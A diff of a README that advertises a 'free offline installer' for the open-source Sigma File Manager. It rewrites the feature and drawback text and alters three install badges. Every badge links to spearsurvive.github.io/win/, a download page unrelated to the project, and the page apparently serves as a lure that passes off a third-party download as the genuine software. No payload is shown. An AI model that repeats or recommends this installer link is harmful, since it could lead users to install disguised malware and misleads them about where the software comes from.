@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-File+Manager-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Sigma File Manager Free Installer** — Sigma File Manager is a free, open-source file manager for Windows, macOS, and Linux with a focus on modern design and useful features like notes attached to files, timeline view, and a customizable workspace. Works without internet access, no account required. Full offline installation.
+**💻 Sigma File Manager Free Installer** — Sigma File Manager is a modern, free, open-source file manager for Windows, macOS, and Linux. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Sigma File Manager](https://img.shields.io/badge/⬇_Install_Sigma%20File%20Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Sigma File Manager](https://img.shields.io/badge/⬇_Install_Sigma+File+Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Sigma File Manager
 
-Sigma File Manager is a free, open-source file manager for Windows, macOS, and Linux with a focus on modern design and useful features like notes attached to files, timeline view, and a customizable workspace. Built with Electron and Vue.js.
+Sigma File Manager is a modern, free, open-source file manager for Windows, macOS, and Linux. Features include a smart homepage dashboard, global search, note-taking integration, privacy-focused design, and a clean modern interface. Sigma File Manager aims to be a complete workspace replacement for power users who want more than basic file navigation.
 
 ---
 
 ## ❌ Problem: Sigma File Manager is hard to access
 
-- **Electron Overhead** — Higher memory usage than native file managers
-- **Early Development** — Feature set still maturing; some features incomplete
-- **Performance** — Directory browsing slower than native file managers on large folders
-- **Small Community** — Limited documentation and user resources
+- **Early Development** — Some planned features still being implemented
+- **Performance** — Resource usage higher than lightweight alternatives
+- **Ecosystem Size** — Smaller user community than established file managers
+- **Plugin Support** — Extension system still maturing
 
 ---
 
@@ -81,7 +81,7 @@ Sigma File Manager is a free, open-source file manager for Windows, macOS, and L
 
 <div align="center">
 
-[![⬇ Install Sigma File Manager](https://img.shields.io/badge/⬇_Install_Sigma%20File%20Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Sigma File Manager](https://img.shields.io/badge/⬇_Install_Sigma+File+Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Sigma File Manager is a free, open-source file manager for Windows, macOS, and L
 
 ---
 
-**Sigma File Manager Free Installer** — Sigma File Manager is a free, open-source file manager for Windows, macOS, and Linux with a focus on modern design and useful features like notes attached to files, timeline view, and a customizable workspace. Install without internet connection today!
+**Sigma File Manager Free Installer** — Sigma File Manager is a modern, free, open-source file manager for Windows, macOS, and Linux. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Sigma File Manager](https://img.shields.io/badge/⬇_Install_Sigma%20File%20Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Sigma File Manager](https://img.shields.io/badge/⬇_Install_Sigma+File+Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
